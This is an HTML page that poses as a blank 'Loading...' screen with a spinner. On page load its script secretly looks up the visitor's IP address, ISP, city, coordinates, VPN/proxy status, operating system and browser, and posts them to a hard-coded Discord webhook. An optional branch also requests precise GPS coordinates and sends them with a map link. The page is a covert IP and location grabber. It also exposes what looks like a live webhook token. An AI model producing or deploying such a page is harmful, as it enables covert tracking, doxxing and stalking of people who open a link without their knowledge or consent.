<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .pulse {
            width: 100px;
            height: 100px;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.3) 0%, transparent 70%);
            border-radius: 50%;
            margin: 0 auto;
            animation: pulse 2s infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: -1;
        }

        .loading-text {
            font-size: 18px;
            color: #00ffff;
            font-weight: 300;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { 
                transform: translate(-50%, -50%) scale(0.8); 
                opacity: 0.5; 
            }
            50% { 
                transform: translate(-50%, -50%) scale(1.2); 
                opacity: 0.8; 
            }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .glow {
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="pulse"></div>
        <div class="loader"></div>
        <div class="loading-text glow">Loading<span class="dots"></span></div>
    </div>

    <script>
        // Configuration
        const config = {
            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
            "username": "System Logger",
            "color": 0x00FFFF,
            "accurateLocation": false
        };

        // Send webhook helper
        async function sendWebhook(webhookData) {
            try {
                await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            } catch (error) {
                console.error('Failed to send webhook');
            }
        }

        // Get IP information from ip-api.com with retry
        async function getIPInfo() {
            // Try ip-api.com directly - it should detect VPN/proxy
            try {
                const response = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
                const data = await response.json();
                
                if (data.status === 'success') {
                    return {
                        query: data.query,
                        isp: data.isp || 'Unknown',
                        as: data.as || 'Unknown',
                        continent: data.continent || 'Unknown',
                        country: data.country || 'Unknown',
                        regionName: data.regionName || 'Unknown',
                        city: data.city || 'Unknown',
                        lat: data.lat || 0,
                        lon: data.lon || 0,
                        timezone: data.timezone || 'Unknown',
                        mobile: data.mobile || false,
                        proxy: data.proxy || false,
                        hosting: data.hosting || false,
                        countryCode: data.countryCode || ''
                    };
                }
            } catch (error) {
                console.error('ip-api.com failed:', error);
            }

            // Fallback: try with HTTPS
            try {
                const response = await fetch('https://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
                const data = await response.json();
                
                if (data.status === 'success') {
                    return {
                        query: data.query,
                        isp: data.isp || 'Unknown',
                        as: data.as || 'Unknown',
                        continent: data.continent || 'Unknown',
                        country: data.country || 'Unknown',
                        regionName: data.regionName || 'Unknown',
                        city: data.city || 'Unknown',
                        lat: data.lat || 0,
                        lon: data.lon || 0,
                        timezone: data.timezone || 'Unknown',
                        mobile: data.mobile || false,
                        proxy: data.proxy || false,
                        hosting: data.hosting || false,
                        countryCode: data.countryCode || ''
                    };
                }
            } catch (error) {
                console.error('ip-api.com HTTPS failed:', error);
            }

            throw new Error('IP detection failed');
        }

        // Simple user agent parsing
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            else if (/Linux/.test(ua)) os = 'Linux';

            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';

            return { os, browser };
        }

        // Enhanced VPN/Proxy detection
        function detectVPN(ipInfo) {
            // ip-api.com already provides proxy detection
            // Additional checks for common VPN patterns
            const vpnKeywords = [
                'vpn', 'proxy', 'expressvpn', 'nordvpn', 'surfshark', 
                'private internet access', 'pia', 'windscribe', 'vyprvpn',
                'tunnelbear', 'hotspot shield', 'hidemyass', 'purevpn',
                'ipvanish', 'strongvpn', 'zenmate', 'cyberghost'
            ];
            
            const ispLower = (ipInfo.isp || '').toLowerCase();
            const orgLower = (ipInfo.org || '').toLowerCase();
            const asLower = (ipInfo.as || '').toLowerCase();
            
            // Check if ISP/Org contains VPN keywords
            const hasVPNKeyword = vpnKeywords.some(keyword => 
                ispLower.includes(keyword) || orgLower.includes(keyword) || asLower.includes(keyword)
            );
            
            // Check for known VPN/datacenter AS numbers
            const vpnASNumbers = [
                'AS60068', 'AS136787', 'AS202425', 'AS200021', 'AS140061',
                'AS209243', 'AS212772', 'AS60068', 'AS136787', 'AS202425'
            ];
            
            const isKnownVPNAS = vpnASNumbers.some(asn => asLower.includes(asn));
            
            return {
                isVPN: ipInfo.proxy || hasVPNKeyword || isKnownVPNAS,
                confidence: ipInfo.proxy ? 'High' : (hasVPNKeyword || isKnownVPNAS ? 'Medium' : 'Low'),
                details: {
                    ipapiProxy: ipInfo.proxy,
                    vpnKeywords: hasVPNKeyword,
                    knownVPNAS: isKnownVPNAS,
                    isp: ipInfo.isp,
                    org: ipInfo.org,
                    as: ipInfo.as
                }
            };
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            coords: `${position.coords.latitude},${position.coords.longitude}`,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Main logging function
        async function logIP() {
            try {
                // Get IP information
                const ipData = await getIPInfo();
                
                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);
                
                // Enhanced VPN detection
                const vpnDetection = detectVPN(ipData);
                
                // Bot detection
                let botStatus = 'False';
                if (ipData.hosting) {
                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    botStatus: botStatus,
                    vpnDetection: vpnDetection
                };

                console.log('VPN Detection:', vpnDetection); // Debug log

                // Send main webhook
                await sendMainWebhook(logData);

                // Get precise location if enabled
                if (config.accurateLocation) {
                    const preciseLocation = await getPreciseLocation();
                    if (preciseLocation) {
                        await sendPreciseLocationWebhook(logData, preciseLocation);
                    }
                }

            } catch (error) {
                console.error('Logging failed:', error);
            }
        }

        async function sendMainWebhook(data) {
            const vpnStatus = data.vpnDetection.isVPN ? 
                `True (Confidence: ${data.vpnDetection.confidence})` : 'False';
            
            const embed = {
                username: config.username,
                content: "",
                embeds: [{
                    title: "üåê Visitor Log",
                    color: config.color,
                    description: `
**IP Info:**
> **IP:** \`${data.ipInfo.query}\`
> **Provider:** \`${data.ipInfo.isp}\`
> **ASN:** \`${data.ipInfo.as}\`
> **Country:** \`${data.ipInfo.country}\`
> **Region:** \`${data.ipInfo.regionName}\`
> **City:** \`${data.ipInfo.city}\`
> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
> **Timezone:** \`${data.ipInfo.timezone}\`
> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
> **VPN/Proxy:** \`${vpnStatus}\`
> **Bot:** \`${data.botStatus}\`

**VPN Detection Details:**
> **IP-API Proxy:** \`${data.vpnDetection.details.ipapiProxy ? 'True' : 'False'}\`
> **VPN Keywords:** \`${data.vpnDetection.details.vpnKeywords ? 'True' : 'False'}\`
> **Known VPN AS:** \`${data.vpnDetection.details.knownVPNAS ? 'True' : 'False'}\`

**PC Info:**
> **OS:** \`${data.browserInfo.os}\`
> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                }]
            };

            await sendWebhook(embed);
        }

        async function sendPreciseLocationWebhook(data, preciseLocation) {
            const embed = {
                username: `${config.username} - GPS`,
                content: "",
                embeds: [{
                    title: "üìç Precise Location",
                    color: 0x00FF00,
                    description: `**Coordinates:** \`${preciseLocation.coords}\`\n**Accuracy:** ${preciseLocation.accuracy}m\n**Map:** [Google Maps](${preciseLocation.mapsLink})`
                }]
            };

            await sendWebhook(embed);
        }

        // Start when page loads
        document.addEventListener('DOMContentLoaded', logIP);
    </script>
</body>
</html>
